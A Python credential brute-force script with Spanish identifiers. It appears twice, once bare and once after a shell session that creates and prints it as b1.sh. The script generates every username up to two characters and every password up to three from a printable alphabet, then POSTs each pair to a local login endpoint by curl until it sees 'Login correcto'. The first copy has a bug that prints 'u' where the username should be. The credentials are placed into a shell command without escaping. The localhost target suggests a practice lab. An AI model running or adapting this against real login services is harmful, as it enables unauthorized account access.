#!/usr/bin/env python3
import time
import subprocess
alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?`~ "
def send_request(username, password):
    command = f'''
    curl -s -X POST \
      http://127.0.0.1:8000/login \
      -H "accept: application/json" \
      -H "Content-Type: application/json" \
      -d '{{"nombre_usuario": "{username}", "contrasena": "{password}"}}'
    '''
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar curl: {e}")
        return ""

def generar_combinaciones(alfabeto, longitud, prefijo="", lista_resultados=None):
    if lista_resultados is None:
        lista_resultados = []
    if longitud == 0:
        lista_resultados.append(prefijo)
    else:
        for c in alfabeto:
            generar_combinaciones(alfabeto, longitud - 1, prefijo + c, lista_resultados)
    return lista_resultados

def main():
    max_len_usuario = 2
    max_len_password = 3
    print("Iniciando fuerza bruta para usuarios y contraseñas...")
    for len_user in range(1, max_len_usuario + 1):
        usuarios = generar_combinaciones(alfabeto, len_user)
        for username in usuarios:
            for len_pass in range(1, max_len_password + 1):
                contrasenas = generar_combinaciones(alfabeto, len_pass)
                for password in contrasenas:
                    response = send_request(username, password)
                    if "Login correcto" in response:
                        print(f"Credenciales válidas encontradas: {"u"}:{password}")
                        return

if __name__ == "__main__":
    main()
airy@DESKTOP-OVHNVEF:~$ nano b1.sh
airy@DESKTOP-OVHNVEF:~$ cat b1.sh
#!/usr/bin/env python3
import time
import subprocess
alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?`~ "
def send_request(username, password):
    command = f'''
    curl -s -X POST \
      http://127.0.0.1:8000/login \
      -H "accept: application/json" \
      -H "Content-Type: application/json" \
      -d '{{"nombre_usuario": "{username}", "contrasena": "{password}"}}'
    '''
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar curl: {e}")
        return ""

def generar_combinaciones(alfabeto, longitud, prefijo="", lista_resultados=None):
    if lista_resultados is None:
        lista_resultados = []
    if longitud == 0:
        lista_resultados.append(prefijo)
    else:
        for c in alfabeto:
            generar_combinaciones(alfabeto, longitud - 1, prefijo + c, lista_resultados)
    return lista_resultados

def main():
    max_len_usuario = 2
    max_len_password = 3
    print("Iniciando fuerza bruta para usuarios y contraseñas...")
    for len_user in range(1, max_len_usuario + 1):
        usuarios = generar_combinaciones(alfabeto, len_user)
        for username in usuarios:
            for len_pass in range(1, max_len_password + 1):
                contrasenas = generar_combinaciones(alfabeto, len_pass)
                for password in contrasenas:
                    response = send_request(username, password)
                    if "Login correcto" in response:
                        print(f"Credenciales válidas encontradas: {username}:{password}")
                        return

if __name__ == "__main__":
    main()
